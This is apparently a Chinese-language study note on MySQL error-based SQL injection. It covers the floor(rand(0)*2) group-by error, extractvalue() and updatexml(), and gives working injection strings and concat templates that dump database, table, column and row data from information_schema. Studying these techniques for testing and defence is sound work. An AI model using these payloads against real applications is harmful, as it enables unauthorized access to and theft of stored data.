sql盲注

1.报错注入

例子：Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;

需要count()计数，concat()将所有行放在同一列上，0x3a表示’:’为了报错好看而已，floor()向下取整，rand()0-1随机数函数，group by 分组。

rand(0) 指定一个固定参数可以制造一个伪随机序列。即可以预测下次出啥数字。

这个报错是利用排序时插入的key值不能相同而报错。利用报错回显出key值。

2.extactvalue(null,concat());2个参数

extractvalue注入的原理：extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。

传入错误路径参数concat()，比如开头不能是~，：等 即0x7e，0x3a等来报错回显。

id=’ or extractvalue(null,concat(0x3a,(select id from users limit 0,1),0x3a))

3.updatexml(null,concat(),null);3个参数

两者都用于处理xml文件，extra相当于取出来数据，update就是跟新文件内容。

原理和extactvalue一样。

id=’ or updatexml(1,concat(0x3a,(select id from users limit 0,1),0x3a),1)

爆数据库 concat(0x3a,(select database()),0x3a)

爆表名concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=’数据库名’),0x3a)

concat(0x3a,(select table_name from information_schema.tables where table_schema=’数据库名’ limit 0,1),0x3a)

limit 0,1 从第0个开始查第一个：1,1就是查第二个。

爆列名concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’表名’),0x3a)

爆数据concat(0x3a,(select 列名 from 表明 limit 0,1),0x3a)
